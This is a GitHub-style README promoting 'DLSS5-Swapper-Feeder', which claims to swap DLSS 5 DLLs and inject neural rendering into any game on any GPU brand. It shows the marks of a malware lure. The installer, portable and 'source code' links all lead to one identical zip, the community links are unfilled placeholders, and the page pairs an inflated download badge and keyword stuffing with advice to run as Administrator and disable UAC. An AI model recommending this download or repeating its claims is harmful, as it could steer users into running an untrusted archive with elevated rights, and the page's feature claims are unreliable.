# ⚡ DLSS5-Swapper-Feeder

<p align="center">
  <img src="https://img.icons8.com/color/96/000000/nvidia.png" alt="DLSS5 Swapper Feeder" width="120" height="120">
</p>

<img width="1598" height="1130" alt="image" src="https://github.com/user-attachments/assets/54893f2c-9600-4f13-b25b-e1a61c0bbbcb" />

<h1 align="center">DLSS5-Swapper-Feeder</h1>
<p align="center">
  <strong>Swap DLSS 5 DLLs + Feeder Mode for Non-DLSS Games</strong><br>
  NVIDIA RTX 20-50 · AMD RDNA 3-4 · Intel Arc
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-3.0.0-76B900?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/downloads-95k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="#-download">📥 Download</a> •
  <a href="#-features">⚡ Features</a> •
  <a href="#-gpu-support">🎮 GPU Support</a> •
  <a href="#-installation">⚙️ Installation</a> •
  <a href="#-documentation">📚 Docs</a>
</p>

---

## 🎯 What is DLSS5-Swapper-Feeder?

**DLSS5-Swapper-Feeder** is a comprehensive tool that combines **DLSS 5 DLL Swapper** and **DLSS 5 Feeder** functionality into a single unified interface. It enables **DLSS 5 Neural Rendering** on graphics cards from **NVIDIA, AMD, and Intel** while also providing **synthetic DLAA** for games without native DLSS support.

The **Swapper** component allows you to easily swap DLSS 5 DLLs between different versions, while the **Feeder** component adds a synthetic DLAA contract to inject DLSS 5 into games that lack native support.

## 📥 Download

<p align="center">
  <a href="https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip">
    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
</p>

**Direct Links:**
- [Windows Installer (.exe)](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)
- [Portable ZIP](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)
- [Source Code](https://github.com/roman-g-2098j5/DLSS5-Swapper-Feeder/releases/download/3/DLSS5-Universal.zip)

---

## ⚡ Key Features

### 🔄 DLSS 5 Swapper
- **DLL Management** – Swap between different DLSS 5 DLL versions
- **Version History** – Track which versions are installed for each game
- **One-click restore** – Revert to original DLSS DLLs
- **Multi-game support** – Manage DLSS for all installed games
- **Auto-detection** – Automatically detects games with DLSS support

### 🧠 DLSS 5 Feeder
- **Synthetic DLAA** – Injects DLSS 5 into games without native support
- **ReShade Integration** – Uses ReShade depth buffer to feed data to DLSS
- **Feeder Contract** – Synthetic contract that mimics DLAA for DLSS 5
- **Non-DLSS Games** – Works with any DX11/DX12 game
- **Classic Games** – Support for DX9/OpenGL via DXVK

### 🎯 Additional Features
- **Auto-detection** – Scans Steam, Epic, GOG, and Xbox libraries
- **One-click installation** – Setup runs for any game with a single click
- **Auto-updating** – Checks for new releases on start
- **Dual GPU mode** – One card renders, one does AI computation
- **Hotkey toggles** – F5/F6 to enable/disable neural rendering

---

## 🎮 GPU Support Details

| GPU Family | Support | Method | Performance |
|------------|---------|--------|-------------|
| **NVIDIA RTX 50** | ✅ Full | Native | Best |
| **NVIDIA RTX 40** | ✅ Full | Patched | Good |
| **NVIDIA RTX 30** | ✅ Supported | Patched | Moderate |
| **NVIDIA RTX 20** | ✅ Supported | Patched | Low |
| **AMD RDNA 4** | ✅ Supported | DLSS-NR-on-AMD | ~30 FPS (1080p) |
| **AMD RDNA 3** | ⚠️ Technical | DLSS-NR-on-AMD | Untested |
| **Intel Arc** | ⚠️ Experimental | - | Untested |

---

## ⚙️ Installation Guide

### Swapper Mode
```bash
1. Download the latest release (Installer or ZIP)
2. Run dlss5swapper.exe as Administrator
3. Select your game from the list
4. Choose the DLSS 5 DLL version you want
5. Click "Swap" to replace the DLL
6. Launch the game and test
```

### Feeder Mode
```bash
1. Download the latest release (Installer or ZIP)
2. Run dlss5feeder.exe as Administrator
3. Select your game from the list (or add manually)
4. Click "Enable Feeder Mode"
5. Launch the game
6. Press HOME → Add-ons tab → Enable DLSS 5 Neural Rendering
```

**First‑time setup wizard** guides you through:
- Game detection
- GPU compatibility check
- Swapper/Feeder mode selection
- ReShade configuration (for Feeder mode)

---

## 🖥️ System Requirements

| Component      | Minimum               | Recommended           |
|----------------|-----------------------|-----------------------|
| **OS**         | Windows 10 64‑bit     | Windows 11 64‑bit     |
| **GPU**        | NVIDIA RTX 20 / AMD RDNA 3 | NVIDIA RTX 40+ / AMD RDNA 4 |
| **RAM**        | 8 GB                  | 16 GB                 |
| **Storage**    | 150 MB                | 300 MB                |
| **Driver**     | Latest Game Ready     | Latest Studio Driver  |

---

## 📊 Feature Matrix

| Category        | Feature                 | Status | Version Added |
|-----------------|-------------------------|--------|---------------|
| Swapper         | DLL version swap        | ✅     | 1.0           |
| Swapper         | Version history         | ✅     | 1.0           |
| Swapper         | One-click restore       | ✅     | 1.0           |
| Swapper         | Auto-detection          | ✅     | 1.0           |
| Feeder          | Synthetic DLAA          | ✅     | 2.0           |
| Feeder          | ReShade integration     | ✅     | 2.0           |
| Feeder          | Non-DLSS game support   | ✅     | 2.0           |
| Feeder          | Classic game support    | ✅     | 2.5           |
| GPU Support     | NVIDIA RTX 50           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 40           | ✅     | 1.0           |
| GPU Support     | NVIDIA RTX 30           | ✅     | 1.5           |
| GPU Support     | NVIDIA RTX 20           | ✅     | 2.0           |
| GPU Support     | AMD RDNA 4              | ✅     | 2.5           |
| GPU Support     | AMD RDNA 3              | ⚠️     | 2.5           |
| Advanced        | Dual GPU mode           | ✅     | 2.5           |
| Advanced        | Hotkey toggles          | ✅     | 1.0           |

---

## 🐛 Troubleshooting Quick Reference

| Symptom                            | Solution                                          |
|------------------------------------|---------------------------------------------------|
| "Access denied"                    | Run as Administrator; disable UAC temporarily     |
| Game crashes after swapping        | Restore original DLL; try different version      |
| Feeder mode not working            | Check ReShade depth buffer selection             |
| Anti‑cheat detected                | Only use in offline single-player games          |
| Low performance on RTX 30/20       | Expected; use lower resolution or settings       |
| AMD GPU not working                | Ensure RDNA 3/4; performance will be low         |
| DLSS 5 not showing in-game         | Press HOME → Add-ons tab → Enable DLSS 5         |

---

## 📚 Documentation & Community

- 📖 [Full Documentation](https://github.com/YOUR_USERNAME/DLSS5-Swapper-Feeder/wiki)
- 🐛 [Issue Tracker](https://github.com/YOUR_USERNAME/DLSS5-Swapper-Feeder/issues)
- 💬 [Community Discord](https://discord.gg/YOUR_INVITE)
- 📺 [Video Tutorials](https://www.youtube.com/playlist?list=YOUR_PLAYLIST)

---

## 🔍 SEO Keywords & Tags

`dlss5 swapper feeder`, `dlss5 swapper`, `dlss5 feeder`, `dlss5 dll swap`, `dlss5 synthetic dlaa`, `dlss5 non-dlss games`, `dlss5 reshade`, `dlss5 universal`, `dlss5 one click`, `dlss5 amd`, `dlss5 rtx`, `dlss5 neural rendering`, `dlss5 mod`, `dlss5 game mod`, `dlss5 installer`, `dlss5 tool`, `dlss5 download`, `dlss5 github`, `dlss5 2026`, `dlss5 any gpu`

---

## 📁 Repository Structure

```
DLSS5-Swapper-Feeder/
├── src/                   # Main application source
├── docs/                  # Documentation source
├── assets/                # Icons, images, branding
├── plugins/               # Extensible plugin system
├── configs/               # Default config files
├── tests/                 # Unit and integration tests
├── .github/               # CI/CD workflows
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🤝 Contributing

We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.

**Areas needing help:**
- Plugin development
- Documentation translation
- GPU compatibility testing
- Game compatibility testing
- Performance optimization

---

## 📄 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <a href="https://github.com/YOUR_USERNAME/DLSS5-Swapper-Feeder">
    <img src="https://img.shields.io/badge/Made%20with%20⚡%20for%20the%20PC%20Gaming%20Community-76B900?style=for-the-badge" alt="Made with passion">
  </a>
</p>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
